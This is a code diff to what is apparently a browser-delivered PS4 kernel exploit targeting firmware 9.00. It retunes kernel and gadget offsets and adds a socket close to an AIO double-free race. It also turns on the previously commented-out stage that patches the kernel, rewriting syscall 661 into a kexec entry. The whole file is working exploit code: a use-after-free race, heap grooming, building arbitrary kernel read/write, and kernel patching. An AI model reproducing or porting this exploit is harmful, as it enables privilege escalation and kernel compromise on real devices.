@@ -144,18 +144,17 @@ async function init() {
     await rop.init();
     chain = new Chain();
 
-    // TODO assumes ps4 9.0x
-    const pthread_offsets = new Map(Object.entries({
-        'pthread_create' : 0x25510,
-        'pthread_join' : 0xAFA0,
-        'pthread_barrier_init' : 0x273D0,
-        'pthread_barrier_wait' : 0xA320,
-        'pthread_barrier_destroy' : 0xFEA0,
-        'pthread_exit' : 0x77A0,
-    }));
+// TODO assumes ps4 9.00
+const pthread_offsets = new Map(Object.entries({
+    'pthread_create' : 0x25510,
+    'pthread_join' : 0xafa0,
+    'pthread_barrier_init' : 0x273d0,
+    'pthread_barrier_wait' : 0xa320,
+    'pthread_barrier_destroy' : 0xfea0,
+    'pthread_exit' : 0x77a0,
+}));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
-
 }
 
 function sys_void(...args) {
@@ -706,8 +705,9 @@ function double_free_reqs2(sds) {
         aio_multi_poll(aio_ids_p, num_reqs);
 
         // drop the reference so that aio_multi_delete() will trigger _fdrop()
+        close(sd_client);
+
         const res = race_one(req_addr, sd_conn, barrier, racer, sds);
-        //alert(res);
         racer.reset();
 
         // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
@@ -716,7 +716,6 @@ function double_free_reqs2(sds) {
         close(sd_conn);
 
         if (res !== null) {
-            
             log(`won race at attempt: ${i}`);
             close(sd_listen);
             call_nze('pthread_barrier_destroy', barrier.addr);
@@ -1241,8 +1240,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('test read of &"evf cv" failed');
     }
 
-    // TODO FW dependent parts! assume ps4 9.000 for now
-    //TODO: Needs porting to 9.00
+    // TODO FW dependent parts! assume ps4 9.00 for now
+
     const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
@@ -1498,7 +1497,6 @@ async function get_patches(url) {
 }
 
 // TODO 9.00 supported only
-//TODO: Needs porting to 9.00
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
         throw RangeError('PS5 kernel patching unsupported');
@@ -1509,12 +1507,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x00410830;
+    const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0xe629c));
+    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1657,7 +1655,6 @@ function setup(block_fd) {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
-    
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
@@ -1668,7 +1665,6 @@ export async function kexploit() {
     const main_mask = new Long();
     get_our_affinity(main_mask);
     log(`main_mask: ${main_mask}`);
-    
 
     // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
     // spraying and grooming easier
@@ -1714,8 +1710,8 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        //log('\nSTAGE: Patch kernel');
-        //await patch_kernel(kbase, kmem, p_ucred, restore_info);
+        log('\nSTAGE: Patch kernel');
+        await patch_kernel(kbase, kmem, p_ucred, restore_info);
     } finally {
         close(unblock_fd);
 
